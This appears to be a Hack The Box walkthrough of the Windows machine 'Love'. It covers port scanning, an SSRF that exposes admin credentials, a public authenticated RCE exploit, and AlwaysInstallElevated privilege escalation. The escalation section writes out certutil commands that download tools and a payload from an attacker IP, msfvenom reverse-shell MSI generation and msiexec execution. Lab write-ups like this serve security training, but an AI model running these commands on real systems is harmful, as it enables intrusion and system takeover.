# About
Love is an easy windows machine where it features a voting system application that suffers from an authenticated remote code execution vulnerability. Our port scan reveals a service running on port 5000 where browsing the page we discover that we are not allowed to access the resource. Furthermore a file scanner application is running on the same server which is though effected by a SSRF vulnerability where it&amp;amp;#039;s exploitation gives access to an internal password manager. We can then gather credentials for the voting system and by executing the remote code execution attack as phoebe user we get the initial foothold on system. Basic windows enumeration reveals that the machine suffers from an elevated misconfiguration. Bypassing the applocker restriction we manage to install a malicious msi file that finally results in a reverse shell as the system account. 

## Skills Required
- Windows Enumeration
- Web Enumeration
## Skills Learned
- Exploit modification
- Server side request forgery
- Applocker policies
- Always install everything misconfiguration

## Enumeration
`nmap -p- -sV -sC 10.129.48.103 --open`
```
PORT      STATE SERVICE      VERSION
80/tcp    open  http         Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27)
|_http-title: Voting System using PHP
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
443/tcp   open  ssl/http     Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)
|_ssl-date: TLS randomness does not represent time
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
|_http-title: 403 Forbidden
| ssl-cert: Subject: commonName=staging.love.htb/organizationName=ValentineCorp/stateOrProvinceName=m/countryName=in
| Not valid before: 2021-01-18T14:00:16
|_Not valid after:  2022-01-18T14:00:16
| tls-alpn: 
|_  http/1.1
445/tcp   open  microsoft-ds Windows 10 Pro 19042 microsoft-ds (workgroup: WORKGROUP)
3306/tcp  open  mysql        MariaDB 10.3.24 or later (unauthorized)
5000/tcp  open  http         Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)
|_http-title: 403 Forbidden
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
5040/tcp  open  unknown
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
5986/tcp  open  ssl/http     Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
| tls-alpn: 
|_  http/1.1
| ssl-cert: Subject: commonName=LOVE
| Subject Alternative Name: DNS:LOVE, DNS:Love
| Not valid before: 2021-04-11T14:39:19
|_Not valid after:  2024-04-10T14:39:19
|_http-server-header: Microsoft-HTTPAPI/2.0
|_ssl-date: 2025-04-17T16:42:05+00:00; +21m32s from scanner time.
7680/tcp  open  pando-pub?
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49668/tcp open  msrpc        Microsoft Windows RPC
49669/tcp open  msrpc        Microsoft Windows RPC
49670/tcp open  msrpc        Microsoft Windows RPC
Service Info: Hosts: www.example.com, LOVE, www.love.htb; OS: Windows; CPE: cpe:/o:microsoft:windows
```
Add love.htb to hosts file and staging.love.htb

### HTTP
http://love.htb/ gives us login screen
![](Images/Pasted%20image%2020250417122446.png)
Searchsploit shows some random modules for exploit
![](Images/Pasted%20image%2020250417122514.png)
Staging gets us some file scanner resource.
![](Images/Pasted%20image%2020250417122614.png)
love.htb:5000 is not allowed to us.
![](Images/Pasted%20image%2020250417122642.png)

## Exploit
Upon doing some testing of the File Scanning website I was able to use the local IP address of the remote host to access 127.0.0.1:5000 bypassing the authentication requirement.
![](Images/Pasted%20image%2020250417122906.png)
`Vote Admin Creds admin: @LoveIsInTheAir!!!! `
Now that we have credentials we can try the `Online Voting System 1.0 - Remote Code Execution (Authenticated)` found in our searchsploit search. [ExploitDB](https://www.exploit-db.com/exploits/49445)
Edit settings and attempt to run it

![](Images/Pasted%20image%2020250417123709.png)
This wasn't working, I realized the directories was wrong and it beings at /admin begins at the root directory.

![](Images/Pasted%20image%2020250417124556.png)
After adjusting we setup the listener and run it again.
![](Images/Pasted%20image%2020250417124617.png)

Grab the user flag
![](Images/Pasted%20image%2020250417124728.png)

## Priv Esc
`certutil -urlcache -split -f http://10.10.14.251:8080/winPEASany.exe winPEASany.exe`
![](Images/Pasted%20image%2020250417125437.png)We can verify the WinPeas output
![](Images/Pasted%20image%2020250417125606.png)
![](Images/Pasted%20image%2020250417130000.png)
So it appears that the path of escalation is due to the misconfiguration of always install as elevated and the user Phoebe having access to write in the administraton directory.
Lets generate a payload and test it out
`msfvenom -p windows/meterpreter/shell_reverse_tcp lhost=10.10.14.251 lport=8686 -f msi -o shell.msi`
`certutil -urlcache -split -f http://10.10.14.251:8080/shell.msi shell.msi`
`msiexec /quiet /i shell.msi`
Original Meterpreter shell wasn't working so lets try a new one
![](Images/Pasted%20image%2020250417130725.png)

`msfvenom -p windows/x64/shell_reverse_tcp lhost=10.10.14.251 lport=8686 -f msi -o shell.msi`
It worked this time around.
![](Images/Pasted%20image%2020250417130814.png)
![](Images/Pasted%20image%2020250417130856.png)